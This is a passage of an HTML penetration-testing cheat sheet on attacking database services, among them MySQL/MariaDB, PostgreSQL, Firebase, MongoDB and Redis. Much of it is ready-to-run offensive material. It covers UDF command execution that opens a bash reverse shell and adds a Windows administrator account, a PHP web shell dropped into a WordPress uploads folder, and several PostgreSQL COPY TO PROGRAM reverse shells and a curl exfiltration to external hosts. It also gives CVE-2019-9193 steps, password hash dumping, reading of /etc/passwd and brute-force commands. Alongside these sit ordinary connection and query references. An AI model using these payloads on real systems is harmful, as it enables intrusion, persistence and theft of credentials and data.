<span class="c"># Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/</span>
<span class="c"># dump in there the library</span>
<span class="k">select</span> <span class="k">*</span> from npn into dumpfile <span class="s1">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so'</span><span class="p">;</span>
<span class="c"># Create a function to execute commands</span>
create <span class="k">function </span>sys_exec returns integer soname <span class="s1">'lib_mysqludf_sys.so'</span><span class="p">;</span>
<span class="c"># Execute commands</span>
<span class="k">select </span>sys_exec<span class="o">(</span><span class="s1">'id &gt; /tmp/out.txt; chmod 777 /tmp/out.txt'</span><span class="o">)</span><span class="p">;</span>
<span class="k">select </span>sys_exec<span class="o">(</span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.66/1234 0&gt;&amp;1"'</span><span class="o">)</span><span class="p">;</span>


<span class="c"># ---------Windows PrivEsc---------</span>
<span class="c"># CHech the linux comments for more indications</span>
USE mysql<span class="p">;</span>
CREATE TABLE npn<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
INSERT INTO npn values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'C://temp//lib_mysqludf_sys.dll'</span><span class="o">))</span><span class="p">;</span>
show variables like <span class="s1">'%plugin%'</span><span class="p">;</span>
SELECT <span class="k">*</span> FROM mysql.npn INTO DUMPFILE <span class="s1">'c://windows//system32//lib_mysqludf_sys_32.dll'</span><span class="p">;</span>
CREATE FUNCTION sys_exec RETURNS integer SONAME <span class="s1">'lib_mysqludf_sys_32.dll'</span><span class="p">;</span>
SELECT sys_exec<span class="o">(</span><span class="s2">"net user npn npn12345678 /add"</span><span class="o">)</span><span class="p">;</span>
SELECT sys_exec<span class="o">(</span><span class="s2">"net localgroup Administrators npn /add"</span><span class="o">)</span><span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="exctract-hashes">Exctract hashes</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select </span>concat_ws<span class="o">(</span><span class="s1">':'</span>, user_login, user_pass<span class="o">)</span> from wp_users<span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="backdoor">Backdoor</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#PHP Backdoor</span>
SELECT <span class="s2">"&lt;?php echo system(</span><span class="nv">$_GET</span><span class="s2">['cmd']); ?&gt;"</span> INTO OUTFILE <span class="s2">"/var/www/html/wp-content/uploads/shell.php"</span><span class="p">;</span>
</code></pre></div>  </div>

</details>

<!----------------------------------------------------------Postgres---------------------------------------------------------------->

<details>
  <summary>Postgresql (5432/5433)</summary>
  <p></p>

  <h2 id="enumeration-2">Enumeration</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap</span>
nmap <span class="nt">--script</span> pgsql-brute <span class="nt">-p</span> 5432 &lt;target-ip&gt;

<span class="c"># metasploit</span>
msf&gt; use auxiliary/scanner/postgres/postgres_version
msf&gt; use auxiliary/scanner/postgres/postgres_dbname_flag_injection
</code></pre></div>  </div>

  <h2 id="bruteforce-2">Bruteforce</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># hydra</span>
hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; postgres
hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; postgres

<span class="c"># Metasploit</span>
msf&gt; use auxiliary/scanner/postgres/postgres_login
msf&gt; <span class="nb">set </span>rhosts &lt;target-ip&gt;
msf&gt; run
</code></pre></div>  </div>

  <h2 id="connect-1">Connect</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Login</span>
psql <span class="nt">-h</span> localhost <span class="nt">-U</span> dripmail_dba <span class="nt">-d</span> dripmail
&lt;Password&gt;
<span class="c"># -W: Force password prompt</span>
psql <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-p</span> &lt;target-port&gt; <span class="nt">-d</span> &lt;database&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-W</span>
<span class="c"># -w: No password</span>
psql <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-p</span> &lt;target-port&gt; <span class="nt">-d</span> &lt;database&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-w</span>
</code></pre></div>  </div>

  <h2 id="commands-2">Commands</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ---------------Basic Commands--------------</span>
<span class="c"># Print help</span>
<span class="se">\?</span>
<span class="c"># Print the version of PostgreSQL</span>
<span class="k">select </span>version<span class="o">()</span><span class="p">;</span>
<span class="c"># Display command history</span>
<span class="se">\s</span>
<span class="c"># List databases</span>
<span class="se">\l</span>
<span class="c"># Switch to the given database</span>
<span class="se">\c</span> &lt;database_name&gt;
<span class="c"># List tables</span>
<span class="se">\d</span>t
<span class="c"># Descibe the table information</span>
<span class="se">\d</span> &lt;table_name&gt;
<span class="c"># Get values in the table</span>
<span class="k">select</span> <span class="k">*</span> from &lt;table&gt;<span class="p">;</span>
<span class="c"># List all users</span>
<span class="se">\d</span>u
<span class="c"># Exit psql shell</span>
<span class="se">\q</span>

<span class="c"># ---------------Port Scanning---------------</span>
SELECT <span class="k">*</span> FROM dblink_connect<span class="o">(</span><span class="s1">'host=1.2.3.4
                              port=5678
                              user=name
                              password=secret
                              dbname=abc
                              connect_timeout=10'</span><span class="o">)</span><span class="p">;</span>

<span class="c"># -------------Get users roles &amp; groups-------------</span>
<span class="c"># r.rolpassword</span>
<span class="c"># r.rolconfig,</span>
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolbypassrls,
      r.rolconnlimit,
      r.rolvaliduntil,
      r.oid,
  ARRAY<span class="o">(</span>SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON <span class="o">(</span>m.roleid <span class="o">=</span> b.oid<span class="o">)</span>
        WHERE m.member <span class="o">=</span> r.oid<span class="o">)</span> as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1<span class="p">;</span>

<span class="c"># Check if current user is superiser</span>
<span class="c">## If response is "on" then true, if "off" then false</span>
SELECT current_setting<span class="o">(</span><span class="s1">'is_superuser'</span><span class="o">)</span><span class="p">;</span>

<span class="c"># Try to grant access to groups</span>
<span class="c">## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)</span>
GRANT pg_execute_server_program TO <span class="s2">"username"</span><span class="p">;</span>
GRANT pg_read_server_files TO <span class="s2">"username"</span><span class="p">;</span>
GRANT pg_write_server_files TO <span class="s2">"username"</span><span class="p">;</span>
<span class="c">## You will probably get this error:</span>
<span class="c">## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.</span>

<span class="c"># Create new role (user) as member of a role (group)</span>
CREATE ROLE u LOGIN PASSWORD <span class="s1">'lriohfugwebfdwrr'</span> IN GROUP pg_read_server_files<span class="p">;</span>
<span class="c">## Common error</span>
<span class="c">## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.</span>

<span class="c"># -----------------Tables-----------------</span>
<span class="c"># Get owners of tables</span>
<span class="k">select </span>schemaname,tablename,tableowner from pg_tables<span class="p">;</span>
<span class="c">## Get tables where user is owner</span>
<span class="k">select </span>schemaname,tablename,tableowner from pg_tables WHERE tableowner <span class="o">=</span> <span class="s1">'postgres'</span><span class="p">;</span>

<span class="c"># Get your permissions over tables</span>
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants<span class="p">;</span>

<span class="c">#Check users privileges over a table (pg_shadow on this example)</span>
<span class="c">## If nothing, you don't have any permission</span>
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE <span class="nv">table_name</span><span class="o">=</span><span class="s1">'pg_shadow'</span><span class="p">;</span>

<span class="c"># ----------------Functions----------------</span>
<span class="c"># Interesting functions are inside pg_catalog</span>
<span class="se">\d</span>f <span class="k">*</span> <span class="c">#Get all</span>
<span class="se">\d</span>f <span class="k">*</span>pg_ls<span class="k">*</span> <span class="c">#Get by substring</span>
<span class="se">\d</span>f+ pg_read_binary_file <span class="c">#Check who has access</span>

<span class="c"># Get all functions of a schema</span>
<span class="se">\d</span>f pg_catalog.<span class="k">*</span>

<span class="c"># Get all functions of a schema (pg_catalog in this case)</span>
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
    LEFT JOIN information_schema.parameters ON routines.specific_name<span class="o">=</span>parameters.specific_name
WHERE routines.specific_schema<span class="o">=</span><span class="s1">'pg_catalog'</span>
ORDER BY routines.routine_name, parameters.ordinal_position<span class="p">;</span>

<span class="c"># Another aparent option</span>
SELECT <span class="k">*</span> FROM pg_proc<span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="read-directories-and-files">Read Directories and Files</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ----------------Read file----------------</span>
CREATE TABLE demo<span class="o">(</span>t text<span class="o">)</span><span class="p">;</span>
COPY demo from <span class="s1">'/etc/passwd'</span><span class="p">;</span>
SELECT <span class="k">*</span> FROM demo<span class="p">;</span>

<span class="c"># ---------Read file or list a directory---------</span>
<span class="c">#Only superusers and users with explicit permissions can use them</span>
<span class="c"># Before executing these function go to the postgres DB (not in the template1)</span>
<span class="se">\c</span> postgres
<span class="c">## If you don't do this, you might get "permission denied" error even if you have permission</span>
<span class="k">select</span> <span class="k">*</span> from pg_ls_dir<span class="o">(</span><span class="s1">'/tmp'</span><span class="o">)</span><span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from pg_read_file<span class="o">(</span><span class="s1">'/etc/passwd'</span>, 0, 1000000<span class="o">)</span><span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from pg_read_binary_file<span class="o">(</span><span class="s1">'/etc/passwd'</span><span class="o">)</span><span class="p">;</span>

<span class="c"># Check who has permissions</span>
<span class="se">\d</span>f+ pg_ls_dir
<span class="se">\d</span>f+ pg_read_file
<span class="se">\d</span>f+ pg_read_binary_file

<span class="c"># Try to grant permissions</span>
GRANT EXECUTE ON <span class="k">function </span>pg_catalog.pg_ls_dir<span class="o">(</span>text<span class="o">)</span> TO username<span class="p">;</span>
<span class="c"># By default you can only access files in the datadirectory</span>
SHOW data_directory<span class="p">;</span>
<span class="c"># But if you are a member of the group pg_read_server_files</span>
<span class="c"># You can access any file, anywhere</span>
GRANT pg_read_server_files TO username<span class="p">;</span>
<span class="c"># Check CREATEROLE privilege escalation</span>

<span class="c"># ----------------File Writing----------------</span>
<span class="c"># Only super users and members of pg_write_server_files can use copy to write files.</span>
copy <span class="o">(</span><span class="k">select </span>convert_from<span class="o">(</span>decode<span class="o">(</span><span class="s1">'&lt;ENCODED_PAYLOAD&gt;'</span>,<span class="s1">'base64'</span><span class="o">)</span>,<span class="s1">'utf-8'</span><span class="o">))</span> to <span class="s1">'/just/a/path.exec'</span><span class="p">;</span>
<span class="c"># if you aren't super user but has the CREATEROLE permissions you can make yourself member of that group:</span>
GRANT pg_write_server_files TO username<span class="p">;</span>
</code></pre></div>  </div>

  <h2 id="config-files-1">Config files</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Version 14.x</span>
/etc/postgresql/14/main/postgresql.conf
<span class="c"># Version 15.x</span>
/etc/postgresql/15/main/postgresql.conf
<span class="c"># Also check env variables</span>
<span class="nb">env</span> <span class="c"># Results</span>
<span class="c"># PGUSER=xxxx</span>
<span class="c"># PGPASSWORD=xxxx</span>
<span class="c"># PGPASSFILE=xxxx</span>
</code></pre></div>  </div>

  <h2 id="privelege-escalation">Privelege Escalation</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># if you have CREATEROLE permission you could grant yourself access to other roles (that aren't superuser) that can give you the option to read &amp; write files and execute commands</span>
<span class="c"># Access to execute commands</span>
GRANT pg_execute_server_program TO username<span class="p">;</span>
<span class="c"># Access to read files</span>
GRANT pg_read_server_files TO username<span class="p">;</span>
<span class="c"># Access to write files</span>
GRANT pg_write_server_files TO username<span class="p">;</span>

<span class="c"># Change password</span>
ALTER USER user_name WITH PASSWORD <span class="s1">'new_password'</span><span class="p">;</span>

<span class="c"># It's pretty common to find that local users can login in PostgreSQL without providing any password. Therefore, once you have gathered permissions to execute code you can abuse these permissions to gran you SUPERUSER role</span>
COPY <span class="o">(</span><span class="k">select</span> <span class="s1">''</span><span class="o">)</span> to PROGRAM <span class="s1">'psql -U &lt;super_user&gt; -c "ALTER USER &lt;your_username&gt; WITH SUPERUSER;"'</span><span class="p">;</span>

<span class="c"># Local login from 127.0.0.1</span>
<span class="c"># Check this function exists</span>
SELECT <span class="k">*</span> FROM pg_proc WHERE <span class="nv">proname</span><span class="o">=</span><span class="s1">'dblink'</span> AND <span class="nv">pronargs</span><span class="o">=</span>2<span class="p">;</span>
<span class="c"># If yes try this</span>
<span class="se">\d</span>u <span class="k">*</span> <span class="c"># Get Users</span>
<span class="se">\l</span>    <span class="c"># Get databases</span>
SELECT <span class="k">*</span> FROM dblink<span class="o">(</span><span class="s1">'host=127.0.0.1
    port=5432
    user=someuser
    password=supersecret
    dbname=somedb'</span>,
    <span class="s1">'SELECT usename,passwd from pg_shadow'</span><span class="o">)</span>
RETURNS <span class="o">(</span>result TEXT<span class="o">)</span><span class="p">;</span>
<span class="c"># And try this</span>
SELECT <span class="k">*</span> FROM dblink<span class="o">(</span><span class="s1">'host=127.0.0.1
                          user=someuser
                          dbname=somedb'</span>,
                         <span class="s1">'SELECT usename,passwd from pg_shadow'</span><span class="o">)</span>
                      RETURNS <span class="o">(</span>result TEXT<span class="o">)</span><span class="p">;</span>

</code></pre></div>  </div>

  <h2 id="command-execution-and-reverse-shell">Command Execution and Reverse Shell</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse shell-1</span>
COPY <span class="o">(</span>SELECT pg_backend_pid<span class="o">())</span> TO PROGRAM <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.18 4444t &gt;/tmp/f'</span><span class="p">;</span>

<span class="c"># Reverse shell-2</span>
<span class="c">#Notice that in order to scape a single quote you need to put 2 single quotes</span>
COPY files FROM PROGRAM <span class="s1">'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'''</span><span class="p">;</span>

<span class="c"># Exfiltration</span>
<span class="s1">'; copy (SELECT '') to program '</span>curl http://YOUR-SERVER?f<span class="o">=</span><span class="sb">`</span><span class="nb">ls</span> <span class="nt">-l</span>|base64<span class="sb">`</span><span class="s1">'-- -

# Using Metasploit
msf&gt; use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf&gt; set rhosts &lt;target-ip&gt;
msf&gt; set lhost &lt;local-ip&gt;
msf&gt; set tablename &lt;table_name&gt;
msf&gt; set username &lt;username&gt;
msf&gt; set password &lt;password&gt;
msf&gt; run
shell

# CVE-2019-9193
nc -lvnp 4444
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM '</span>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1"</span><span class="s1">';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
</span></code></pre></div>  </div>

  <h2 id="dump-and-decrypt-user-hashes-from-database">Dump and Decrypt User Hashes from Database</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Dump user hash via Metasploit</span>
msf&gt; use auxiliary/scanner/postgres/postgres_hashdump
msf&gt; <span class="nb">set </span>rhosts &lt;target-ip&gt;
msf&gt; <span class="nb">set </span>username &lt;username&gt;
msf&gt; <span class="nb">set </span>password &lt;password&gt;
msf&gt; run

<span class="c"># Using gpg</span>
<span class="c"># 1- if user hass privileges to access postgress backups</span>
gpg <span class="nt">--batch</span> <span class="nt">--yes</span> <span class="nt">--passphrase</span> <span class="s2">"2Qa2SsBkQvsc"</span> <span class="nt">--pinentry-mode</span> loopback <span class="nt">--decrypt</span> /var/backups/postgres/dev-dripmail.old.sql.gpg <span class="o">&gt;</span> dev-dripmail.old.sql
<span class="c"># 2- Read the content</span>
<span class="nb">cat </span>dev-dripmail.old.sql
<span class="c"># 3- Decrypt hash:</span>
</code></pre></div>  </div>

  <h2 id="dump-credentilas-from-pgadmin-db-files">Dump credentilas from pgadmin .db files</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># pgadmin is an administration and development platform for PostgreSQL.</span>
sqlite3 pgadmin4.db <span class="s2">".schema"</span>
sqlite3 pgadmin4.db <span class="s2">"select * from user;"</span>
sqlite3 pgadmin4.db <span class="s2">"select * from server;"</span>
string pgadmin4.db
</code></pre></div>  </div>
</details>

<!----------------------------------------------------------Firebase---------------------------------------------------------------->

<details>
  <summary>Firebase</summary>
  <p></p>

  <h2 id="tools-1">Tools</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># https://github.com/Turr0n/firebase</span>
python3 firebase.py <span class="nt">-p</span> 4 <span class="nt">--dnsdumpster</span> <span class="nt">-l</span> file

<span class="c"># https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit</span>
Firebase_Exploit.py

<span class="c"># https://github.com/viperbluff/Firebase-Extractor</span>
firebase.py xyz.firebaseio.com

<span class="c"># https://github.com/securebinary/firebaseExploiter</span>
firebaseExploiter <span class="nt">-u</span> URL <span class="nt">-exploit</span>
</code></pre></div>  </div>

</details>

<!----------------------------------------------------------MongoDB---------------------------------------------------------------->

<details>
  <summary>MongoDB (27017,27018)</summary>
  <p></p>

  <h2 id="enumeration-3">Enumeration</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> mongodb-info <span class="nt">-p</span> 27017 &lt;target-ip&gt;
nmap <span class="nt">--script</span> mongodb-databases <span class="nt">-p</span> 27017 &lt;target-ip&gt;
</code></pre></div>  </div>

  <h2 id="bruteforce-3">Bruteforce</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> username <span class="nt">-P</span> passwords.txt &lt;target-ip&gt; mysql
hydra <span class="nt">-L</span> usernames.txt <span class="nt">-p</span> password &lt;target-ip&gt; mysql
</code></pre></div>  </div>

  <h2 id="connection">Connection</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Local</span>
mongo
mongo <span class="nt">--port</span> 27017

<span class="c"># Remote</span>
mongo <span class="nt">--host</span> &lt;target-ip&gt; <span class="nt">--port</span> 27017 <span class="nt">-u</span> username <span class="nt">-p</span> password
mongo <span class="s2">"mongodb://&lt;target-ip&gt;:27017"</span>
mongo <span class="s2">"mongodb://username:password@&lt;target-ip&gt;:27017/?authSource=admin"</span>
mongo <span class="nt">--username</span> <span class="s2">"USER"</span> <span class="nt">--password</span> <span class="nt">--authenticationDatabase</span> <span class="s2">"DBNAME"</span> <span class="nt">--host</span> <span class="s2">"HOSTNAME"</span> <span class="nt">--port</span> 27017
</code></pre></div>  </div>

  <h2 id="credentialsconfig">Credentials/Config</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/bitnami/mongodb/mongodb.conf
<span class="nb">grep</span> <span class="s2">"noauth.*true"</span> /opt/bitnami/mongodb/mongodb.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^#"</span> <span class="c">#Not needed</span>
<span class="nb">grep</span> <span class="s2">"auth.*true"</span> /opt/bitnami/mongodb/mongodb.conf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"^#</span><span class="se">\|</span><span class="s2">noauth"</span> <span class="c">#Not needed</span>
</code></pre></div>  </div>

  <h2 id="commands-3">Commands</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># All databases</span>
<span class="o">&gt;</span> show dbs
<span class="c"># Current database</span>
<span class="o">&gt;</span> db
<span class="c"># Switch database if it exists, or create new if not exist</span>
<span class="o">&gt;</span> use db_name
<span class="c"># Collections</span>
<span class="o">&gt;</span> show collections
<span class="c"># Run javascript file</span>
<span class="o">&gt;</span> load<span class="o">(</span><span class="s2">"example.js"</span><span class="o">)</span>

<span class="c"># List users in the current database</span>
<span class="o">&gt;</span> show <span class="nb">users</span>
<span class="o">&gt;</span> db.admin.find<span class="o">()</span>

<span class="c"># Create new collection in current database</span>
<span class="o">&gt;</span> db.createCollection<span class="o">(</span><span class="s2">"users"</span><span class="o">)</span>
</code></pre></div>  </div>

  <h2 id="crud">CRUD</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.insert<span class="o">({</span><span class="nb">id</span>: <span class="s2">"1"</span>, username: <span class="s2">"admin"</span><span class="o">})</span>
<span class="c"># Read</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.find<span class="o">()</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.findOne<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"michael"</span><span class="o">})</span>
<span class="c"># Update</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.update<span class="o">({</span><span class="nb">id</span>: <span class="s2">"1"</span><span class="o">}</span>, <span class="o">{</span><span class="nv">$set</span>: <span class="o">{</span>username: <span class="s2">"king"</span><span class="o">}})</span>
<span class="c"># Delete</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.remove<span class="o">({</span><span class="s2">"name"</span>: <span class="s2">"Micael"</span><span class="o">})</span>
<span class="c"># Delete all documents</span>
<span class="o">&gt;</span> db.&lt;collection_name&gt;.remove<span class="o">({})</span>
</code></pre></div>  </div>

  <h2 id="operators">Operators</h2>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># $eq: equal</span>
<span class="c"># ex. username is "admin"</span>
db.&lt;collection_name&gt;.findOne<span class="o">({</span>username: <span class="o">{</span><span class="s2">"</span><span class="nv">$eq</span><span class="s2">"</span>: <span class="s2">"admin"</span><span class="o">}})</span>

<span class="c"># $ne: not equal</span>
<span class="c"># ex. password is not "xyz"</span>
db.&lt;collection_name&gt;.findOne<span class="o">({</span><span class="nb">id</span>: <span class="s2">"1"</span><span class="o">}</span>, <span class="o">{</span>password: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: <span class="s2">"xyz"</span><span class="o">}})</span>

<span class="c"># $gt: greater than</span>
<span class="c"># ex. id is greater than 2</span>
db.&lt;collection_name&gt;.findOne<span class="o">({</span><span class="nb">id</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$gt</span><span class="s2">"</span>: <span class="s2">"2"</span><span class="o">}})</span>

<span class="c"># $match: filter the documents to pass only the documents that match the specified conditions to the next pipeline stage.</span>
<span class="o">{</span><span class="nv">$match</span>: <span class="o">{</span> username: <span class="s2">"admin"</span> <span class="o">}}</span>

<span class="c"># $lookup: join to a collection in the same database to filter in documents from the "joined" collection for processing.</span>
<span class="o">{</span>
    <span class="nv">$lookup</span>:
        <span class="o">{</span>
            from: <span class="s2">"users"</span>,
            localField: <span class="s2">"_id"</span>,
            foreignField: <span class="s2">"_id"</span>,
            as: <span class="s2">"test"</span>
        <span class="o">}</span>
<span class="o">}</span>
</code></pre></div>  </div>
</details>

<!-- --------------------------------------------------------Redis-------------------------------------------------------------- -->

<details>
  <summary>Redis (6379)</summary>
  <p></p>

  <h3 id="enumeration-4">Enumeration</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">--script</span> redis-info <span class="nt">-p</span> 6379 &lt;target-ip&gt;
nmap <span class="nt">--script</span> redis-brute <span class="nt">-p</span> 6379 &lt;target-ip&gt;

<span class="c">#Metasploit</span>
use auxiliary/scanner/redis/redis_server
msf auxiliary<span class="o">(</span>scanner/redis/redis_server<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.10.10.10
msf auxiliary<span class="o">(</span>scanner/redis/redis_server<span class="o">)</span> <span class="o">&gt;</span> exploit
</code></pre></div>  </div>

  <h3 id="config">Config</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-name</span> <span class="s2">"redis.conf"</span> 2&gt;/dev/null
<span class="nb">grep</span> <span class="nt">-i</span> pass /path/to/redis.conf
</code></pre></div>  </div>

  <h3 id="connect-2">Connect</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Connect via CLI</span>
redis-cli <span class="nt">-u</span> redis://xxx.example.com
redis-cli <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-p</span> 6379
<span class="c"># with password</span>
redis-cli <span class="nt">-h</span> &lt;target-ip&gt; <span class="nt">-p</span> 6379 <span class="nt">-a</span> password
redis-cli <span class="nt">-h</span> &lt;<span class="nb">hostname</span><span class="o">&gt;</span> <span class="nt">-p</span> &lt;port&gt; <span class="nt">--user</span> &lt;username&gt; <span class="nt">-a</span> &lt;password&gt;
redis://:&lt;password&gt;@&lt;<span class="nb">hostname</span><span class="o">&gt;</span>:&lt;port&gt;
<span class="c"># using socket</span>
redis-cli <span class="nt">-s</span> /path/to/redis.sock
</code></pre></div>  </div>

  <h3 id="commands-4">Commands</h3>
  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check credentials</span>
<span class="o">&gt;</span> auth &lt;username&gt; &lt;password&gt;
<span class="o">&gt;</span> auth default &lt;password&gt;

<span class="c"># Set a password temporary until the service restarts.</span>
<span class="o">&gt;</span> config <span class="nb">set </span>requirepass &lt;password&gt;

<span class="c"># Information on the Redis server</span>
<span class="o">&gt;</span> info
<span class="o">&gt;</span> info keyspace

<span class="c"># List all</span>
<span class="o">&gt;</span> config get <span class="k">*</span>

<span class="c"># List all databases</span>
<span class="o">&gt;</span> config get databases

<span class="c"># Select the database ('select &lt;index&gt;')</span>
<span class="o">&gt;</span> <span class="k">select </span>0
<span class="o">&gt;</span> <span class="k">select </span>1
<span class="o">&gt;</span> <span class="k">select </span>12

<span class="c"># Read files and directories using Lua scripts</span>
<span class="o">&gt;</span> <span class="nb">eval</span> <span class="s2">"dofile('C:</span><span class="se">\\\\</span><span class="s2">Users</span><span class="se">\\\\</span><span class="s2">Administrator</span><span class="se">\\\\</span><span class="s2">Desktop</span><span class="se">\\\\</span><span class="s2">user.txt')"</span> 0
<span class="o">&gt;</span> <span class="nb">eval</span> <span class="s2">"dofile('C:</span><span class="se">\\\\</span><span class="s2">Users</span><span class="se">\\\\</span><span class="s2">&lt;username&gt;</span><span class="se">\\\\</span><span class="s2">Desktop</span><span class="se">\\\\</span><span class="s2">user.txt')"</span> 0

<span class="c"># Find all keys</span>
<span class="o">&gt;</span> keys <span class="k">*</span>

<span class="c"># Get the type of value</span>
<span class="o">&gt;</span> <span class="nb">type</span> &lt;key_name&gt;

<span class="c"># Get all fields and values of the hash stored at key.</span>
<span class="o">&gt;</span> hgetall &lt;key&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> hgetall admin

<span class="c"># Get a string value</span>
<span class="o">&gt;</span> get &lt;key&gt; &lt;field&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> get admin email

<span class="c"># Get a hashed value</span>
<span class="o">&gt;</span> hget &lt;key&gt; &lt;field&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> hget admin password

<span class="c"># Get multiple hashed values associated with specified fields</span>
<span class="o">&gt;</span> hmget &lt;key&gt; &lt;field1&gt; &lt;field2&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> hmget admin email password

<span class="c"># type: lists</span>
<span class="o">&gt;</span> lrange &lt;key_name&gt; &lt;start&gt; &lt;stop&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> lrange <span class="s2">"userlist"</span> 0 0
<span class="o">&gt;</span> lrange <span class="s2">"userlist"</span> 0 5

<span class="c"># type: sets</span>
<span class="o">&gt;</span> smembers &lt;key_name&gt;

<span class="c"># type: sorted sets</span>
<span class="o">&gt;</span> zrangebyscore &lt;key_name&gt; &lt;min&gt; &lt;max&gt;

<span class="c"># type: stream</span>
<span class="o">&gt;</span> xread count &lt;count&gt; streams &lt;key_name&gt; &lt;<span class="nb">id</span><span class="o">&gt;</span>

<span class="c"># Set a hashed value in a field</span>
<span class="o">&gt;</span> <span class="nb">set</span> &lt;key&gt; &lt;field&gt; &lt;value&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> <span class="nb">set </span>admin email admin@example.com

<span class="c"># Set a hashed value in a field</span>
<span class="o">&gt;</span> hset &lt;key&gt; &lt;field&gt; &lt;value&gt;
<span class="c"># e.g.</span>
<span class="o">&gt;</span> hset admin password 286755fad04869ca523320acce0dc6a4

<span class="o">&gt;</span> lpush &lt;key&gt; &lt;element&gt;
<span class="o">&gt;</span> lpush &lt;key&gt; &lt;element&gt; &lt;element&gt;
<span class="o">&gt;</span> lpush &lt;key&gt; &lt;element&gt; &lt;element&gt; &lt;element&gt;
<span class="c"># e.g.</span>
